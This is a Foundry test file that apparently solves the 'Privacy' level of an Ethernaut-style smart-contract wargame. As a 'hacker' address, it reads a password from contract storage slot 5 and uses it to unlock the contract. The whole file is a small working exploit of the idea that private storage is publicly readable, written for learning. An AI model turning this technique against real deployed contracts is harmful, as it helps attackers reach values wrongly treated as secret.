// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Privacy} from "../src/12_Privacy.sol";

contract PrivacyTest is Test {
    Privacy public py;

    address public hacker = address(0x1337); 
    
    function setUp() public {
        bytes32[3] memory secretPassword;
        secretPassword[2] = bytes32("very strong pwd");
        py = new Privacy(secretPassword);
        vm.deal(hacker, 10 ether); 
    }

    function testExploit() public {
        vm.startPrank(hacker);
        console.log("locked value before:", py.locked());
        bytes32 interceptedPassword = vm.load(address(py), bytes32(uint256(5)));
        py.unlock(bytes16(interceptedPassword));
        assertEq(py.locked(), false);
        console.log("locked value after:", py.locked());
        vm.stopPrank();
    }
}